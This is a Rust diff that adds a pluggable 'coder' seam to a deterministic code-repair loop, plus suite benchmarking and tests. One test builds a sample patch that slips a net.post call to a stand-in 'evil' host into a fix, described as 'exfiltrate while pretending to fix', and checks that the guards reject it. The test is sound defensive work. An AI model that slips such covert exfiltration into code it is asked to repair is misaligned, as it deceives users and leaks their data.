@@ -92,6 +92,10 @@ pub struct Metrics {
     pub tests_run: usize,
     pub regressions: usize,
     pub diff_chars: usize,
+    /// Of `patches_applied`, how many came from a coder rather than a structured
+    /// diagnostic. Stays 0 on the default model-free path.
+    #[serde(default)]
+    pub coder_patches: usize,
     /// Wall-clock to green, in microseconds (the loop is sub-millisecond).
     /// `u64` rather than `u128` so it round-trips through serde's internally
     /// tagged `TraceFile` enum, whose content buffer rejects 128-bit integers.
@@ -118,8 +122,23 @@ impl FixOutcome {
     }
 }
 
-/// Run the repair loop on a workspace until it is green, stuck, or out of laps.
+/// Run the deterministic repair loop on a workspace until it is green, stuck, or
+/// out of laps. No model, no coder — structured patches only.
 pub fn fix(base: Workspace, strategy: Strategy, max_laps: usize) -> FixOutcome {
+    fix_with_coder(base, strategy, max_laps, None)
+}
+
+/// The repair loop with an optional coder consulted only when deterministic
+/// repair is exhausted. The coder never bypasses the safety net: whatever it
+/// proposes goes through the exact same `verify_patch` pipeline and is committed
+/// only if it passes. The default (`None`) path stays model-free and is what the
+/// test suite and CI exercise.
+pub fn fix_with_coder(
+    base: Workspace,
+    strategy: Strategy,
+    max_laps: usize,
+    coder: Option<&dyn Coder>,
+) -> FixOutcome {
     let start = Instant::now();
     let mut ws = base.clone();
     let mut laps: Vec<Lap> = Vec::new();
@@ -158,6 +177,55 @@ pub fn fix(base: Workspace, strategy: Strategy, max_laps: usize) -> FixOutcome {
         let diag = match candidates.first().copied() {
             Some(d) => d,
             None => {
+                // Deterministic repair is exhausted. If a coder is wired in, let
+                // it propose a typed patch — still gated by the same pipeline.
+                if let Some(coder) = coder {
+                    let failing = failing_test_names(&report);
+                    let req = CoderRequest {
+                        workspace: &ws,
+                        errors: &errors,
+                        failing_tests: &failing,
+                    };
+                    if let Some(patch) = coder.propose(&req) {
+                        let verdict = verify_patch(&ws, &patch, &VerifyOpts::default());
+                        let psum = patch_summary(&patch);
+                        let vsum = verdict_summary(&verdict);
+                        metrics.tests_run += verdict.tests_run();
+                        if verdict.rejections.iter().any(|r| r.contains("regressed")) {
+                            metrics.regressions += 1;
+                        }
+                        if verdict.accepted {
+                            metrics.patches_applied += 1;
+                            metrics.coder_patches += 1;
+                            metrics.diff_chars += patch
+                                .edits
+                                .iter()
+                                .map(|e| e.replacement.len())
+                                .sum::<usize>();
+                            ws = verdict.workspace.clone();
+                            laps.push(Lap {
+                                index: lap_i,
+                                action: format!("applied coder patch {}", patch.name),
+                                targeted: None,
+                                patch: Some(psum),
+                                verdict: Some(vsum),
+                                errors_remaining: verdict.errors_after,
+                            });
+                            continue;
+                        }
+                        metrics.patches_rejected += 1;
+                        laps.push(Lap {
+                            index: lap_i,
+                            action: format!("rejected coder patch {}", patch.name),
+                            targeted: None,
+                            patch: Some(psum),
+                            verdict: Some(vsum),
+                            errors_remaining: error_count,
+                        });
+                        status = "stuck".into();
+                        break;
+                    }
+                }
                 laps.push(Lap {
                     index: lap_i,
                     action: "no actionable diagnostic — needs a model-backed coder".into(),
@@ -351,6 +419,126 @@ pub fn race(base: Workspace, max_laps: usize) -> RaceOutcome {
     }
 }
 
+// ----- the coder seam -----
+
+/// What the loop hands a coder when deterministic repair is exhausted: the
+/// current workspace plus the problems that remain. A coder reads this and may
+/// propose a typed `Patch` — the same kind of object a diagnostic carries.
+pub struct CoderRequest<'a> {
+    pub workspace: &'a Workspace,
+    pub errors: &'a [Diagnostic],
+    pub failing_tests: &'a [String],
+}
+
+/// A pluggable patch source for the cases structured repair can't reach (syntax
+/// errors, logic bugs). It is consulted *after* every deterministic option is
+/// gone, and its output is verified by the same pipeline as any other patch — a
+/// coder can never bypass scope, effect, API, or regression guards.
+///
+/// The default loop uses no coder at all. A model-backed coder is one future
+/// implementation of this trait; `FixtureCoder` is a deterministic one used to
+/// test the seam offline.
+pub trait Coder {
+    fn propose(&self, req: &CoderRequest) -> Option<Patch>;
+}
+
+/// A deterministic, offline coder: a fixed table of candidate patches. It
+/// proposes the first one that applies cleanly and actually changes the current
+/// workspace, leaving acceptance to `verify_patch`. This stands in for a real
+/// model so the seam — and everything downstream of it — is fully testable with
+/// no network and no nondeterminism.
+pub struct FixtureCoder {
+    patches: Vec<Patch>,
+}
+
+impl FixtureCoder {
+    pub fn new(patches: Vec<Patch>) -> Self {
+        FixtureCoder { patches }
+    }
+}
+
+impl Coder for FixtureCoder {
+    fn propose(&self, req: &CoderRequest) -> Option<Patch> {
+        self.patches
+            .iter()
+            .find(|p| match req.workspace.apply_edits(&p.edits) {
+                Ok(after) => after.files != req.workspace.files,
+                Err(_) => false,
+            })
+            .cloned()
+    }
+}
+
+fn failing_test_names(report: &crate::runner::TestReport) -> Vec<String> {
+    report
+        .outcomes
+        .iter()
+        .filter(|o| !o.passed)
+        .map(|o| o.name.clone())
+        .collect()
+}
+
+// ----- suite benchmarking -----
+
+/// One case's result within a suite run.
+#[derive(Clone, Debug, Serialize, Deserialize)]
+pub struct SuiteCase {
+    pub name: String,
+    pub outcome: FixOutcome,
+}
+
+/// Aggregate metrics across a whole suite. `us` (wall-clock) is excluded from
+/// any determinism comparison — it is the one field allowed to vary run to run.
+#[derive(Clone, Debug, Serialize, Deserialize, Default)]
+pub struct SuiteMetrics {
+    pub cases: usize,
+    pub green: usize,
+    pub laps: usize,
+    pub patches_applied: usize,
+    pub tests_run: usize,
+    pub regressions: usize,
+    pub diff_chars: usize,
+    pub us: u64,
+}
+
+#[derive(Clone, Debug, Serialize, Deserialize)]
+pub struct SuiteOutcome {
+    pub cases: Vec<SuiteCase>,
+    pub totals: SuiteMetrics,
+}
+
+impl SuiteOutcome {
+    pub fn all_green(&self) -> bool {
+        self.totals.cases > 0 && self.totals.green == self.totals.cases
+    }
+}
+
+/// Run the repair loop over every case in a suite, in the given order, and
+/// aggregate the agent-era metrics. Each case is repaired independently on its
+/// own workspace, exactly as `tach fix` would, so the suite measures the loop,
+/// not any cross-case state.
+pub fn run_suite(cases: Vec<(String, Workspace)>, max_laps: usize) -> SuiteOutcome {
+    let mut out_cases = Vec::new();
+    let mut totals = SuiteMetrics::default();
+    for (name, ws) in cases {
+        let outcome = fix(ws, Strategy::Minimal, max_laps);
+        let m = &outcome.metrics;
+        totals.cases += 1;
+        totals.green += usize::from(outcome.is_green());
+        totals.laps += m.laps;
+        totals.patches_applied += m.patches_applied;
+        totals.tests_run += m.tests_run;
+        totals.regressions += m.regressions;
+        totals.diff_chars += m.diff_chars;
+        totals.us += m.us;
+        out_cases.push(SuiteCase { name, outcome });
+    }
+    SuiteOutcome {
+        cases: out_cases,
+        totals,
+    }
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -423,5 +611,121 @@ test "expired session rejected" {
         // minimal (annotation fix) has a smaller diff than convert (to_string).
         assert_eq!(out.branches[w].strategy, "minimal");
         assert!(out.branches.iter().all(|b| b.is_green()));
+    }
+
+    fn corpus_cases() -> Vec<(String, Workspace)> {
+        let dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("corpus");
+        crate::project::load_suite(&dir).expect("load corpus")
+    }
+
+    #[test]
+    fn corpus_all_reaches_green() {
+        let cases = corpus_cases();
+        assert!(
+            cases.len() >= 6,
+            "corpus should cover every diagnostic family"
+        );
+        let out = run_suite(cases, 16);
+        for c in &out.cases {
+            assert_eq!(
+                c.outcome.status, "green",
+                "case `{}` did not reach green: {:#?}",
+                c.name, c.outcome.laps
+            );
+            assert_eq!(
+                c.outcome.metrics.regressions, 0,
+                "case `{}` regressed a test",
+                c.name
+            );
+        }
+        assert!(out.all_green());
+        assert_eq!(out.totals.regressions, 0);
+    }
+
+    #[test]
+    fn coder_repairs_a_logic_bug_through_the_pipeline() {
+        use crate::span::Span;
+
+        const SRC: &str = "fn double(x: Int) -> Int {\n  return x\n}\n";
+        const TST: &str = "test \"double doubles\" {\n  ensure double(2) == 4\n}\n";
+        let mut ws = Workspace::new();
+        ws.insert("src/m.tach", SRC);
+        ws.insert("tests/m_test.tach", TST);
+
+        // A logic bug carries no patch, so the deterministic loop alone is stuck.
+        let stuck = fix(ws.clone(), Strategy::Minimal, 8);
+        assert_eq!(stuck.status, "stuck");
+        assert_eq!(stuck.metrics.coder_patches, 0);
+
+        // A fixture coder proposes the typed fix; the same pipeline verifies it.
+        let at = SRC.find("return x").unwrap();
+        let patch = Patch {
+            name: "coder:double".into(),
+            reason: "double should multiply its argument".into(),
+            touches: vec!["src/**".into()],
+            edits: vec![Edit {
+                file: "src/m.tach".into(),
+                span: Span::new(at, at + "return x".len()),
+                replacement: "return x * 2".into(),
+            }],
+            prove: vec!["tach test".into()],
+        };
+        let coder = FixtureCoder::new(vec![patch]);
+        let out = fix_with_coder(ws, Strategy::Minimal, 8, Some(&coder));
+        assert_eq!(out.status, "green", "laps: {:#?}", out.laps);
+        assert_eq!(out.metrics.coder_patches, 1);
+        assert_eq!(out.metrics.regressions, 0);
+        assert!(out.final_files["src/m.tach"].contains("x * 2"));
+    }
+
+    #[test]
+    fn coder_patch_still_obeys_the_guards() {
+        use crate::span::Span;
+
+        // A coder patch that introduces a new effect must be rejected, exactly
+        // like any other patch — the coder gets no special privileges.
+        const SRC: &str = "fn double(x: Int) -> Int {\n  return x\n}\n";
+        const TST: &str = "test \"double doubles\" {\n  ensure double(2) == 4\n}\n";
+        let mut ws = Workspace::new();
+        ws.insert("src/m.tach", SRC);
+        ws.insert("tests/m_test.tach", TST);
+
+        let at = SRC.find("return x").unwrap();
+        let patch = Patch {
+            name: "coder:sneaky".into(),
+            reason: "exfiltrate while pretending to fix".into(),
+            touches: vec!["src/**".into()],
+            edits: vec![Edit {
+                file: "src/m.tach".into(),
+                span: Span::new(at, at + "return x".len()),
+                replacement: "net.post(\"http://evil\", \"x\")\n  return x * 2".into(),
+            }],
+            prove: vec![],
+        };
+        let coder = FixtureCoder::new(vec![patch]);
+        let out = fix_with_coder(ws, Strategy::Minimal, 8, Some(&coder));
+        assert_eq!(
+            out.status, "stuck",
+            "a new-effect patch must not be committed"
+        );
+        assert_eq!(out.metrics.coder_patches, 0);
+    }
+
+    #[test]
+    fn suite_is_deterministic() {
+        let a = run_suite(corpus_cases(), 16);
+        let b = run_suite(corpus_cases(), 16);
+        // every non-timing field must match byte-for-byte across runs.
+        let files = |o: &SuiteOutcome| {
+            o.cases
+                .iter()
+                .map(|c| (c.name.clone(), c.outcome.final_files.clone()))
+                .collect::<Vec<_>>()
+        };
+        assert_eq!(files(&a), files(&b));
+        assert_eq!(a.totals.green, b.totals.green);
+        assert_eq!(a.totals.laps, b.totals.laps);
+        assert_eq!(a.totals.patches_applied, b.totals.patches_applied);
+        assert_eq!(a.totals.diff_chars, b.totals.diff_chars);
     }
 }
